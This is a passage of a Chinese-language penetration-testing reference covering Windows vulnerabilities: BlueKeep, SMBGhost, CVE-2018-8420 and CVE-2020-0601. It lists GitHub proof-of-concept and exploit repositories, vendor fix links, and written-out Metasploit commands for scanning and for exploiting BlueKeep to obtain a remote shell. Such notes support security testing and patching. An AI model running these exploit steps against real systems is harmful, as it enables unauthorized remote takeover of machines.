    - [Ekultek/BlueKeep](https://github.com/Ekultek/BlueKeep)
    - [mekhalleh/cve-2019-0708](https://github.com/mekhalleh/cve-2019-0708) (实测、蓝屏)
    - [Cyb0r9/ispy](https://github.com/Cyb0r9/ispy)
    - [k8gege/CVE-2019-0708](https://github.com/k8gege/CVE-2019-0708) - 批量检测工具

- 修复工具
    - ["CVE-2019-0708"漏洞检测修复工具](https://www.qianxin.com/other/CVE-2019-0708)
    - https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708

- MSF 模块
    ```bash
    # 发现,检测
    use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
    set rhosts <ip>
    run
    ```
    ```bash
    # 利用
    use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
    set target <1-7>
    set rhosts <ip>
    show options
    exploit
    shell
    python
    ```

**CVE-2020-0796 微软 SMBv3 协议远程代码执行漏洞**
- 简介

    2020年3月11日，思科 Talos 发布了一个威胁等级被标记为 Critical 的 SMB 服务远程代码执行漏洞（CVE-2020-0796）综述，攻击者可以利用此漏洞远程无需用户验证通过发送构造特殊的恶意数据导致在目标系统上执行恶意代码，从而获取机器的完全控制。

    本次漏洞存在于微软 SMBv3.0 协议中，该漏洞是由 SMBv3 处理恶意压缩数据包时进入错误流程造成的。攻击者利用该漏洞无须权限即可实现远程代码执行，受黑客攻击的目标系统只需开机在线即可能被入侵。

- POC | Payload | exp
    - [ollypwn/SMBGhost](https://github.com/ollypwn/SMBGhost)

- 修复工具
    - https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0796

---

## 其他

**CVE-2018-8420 Msxml 解析器的远程代码执行漏洞**
- POC | Payload | exp
    - [Lz1y/CVE-2018-8420](https://github.com/Lz1y/CVE-2018-8420)

**CVE-2020-0601**
- POC | Payload | exp
    - [ollypwn/CVE-2020-0601](https://github.com/ollypwn/CVE-2020-0601)
    - [kudelskisecurity/chainoffools](https://github.com/kudelskisecurity/chainoffools)
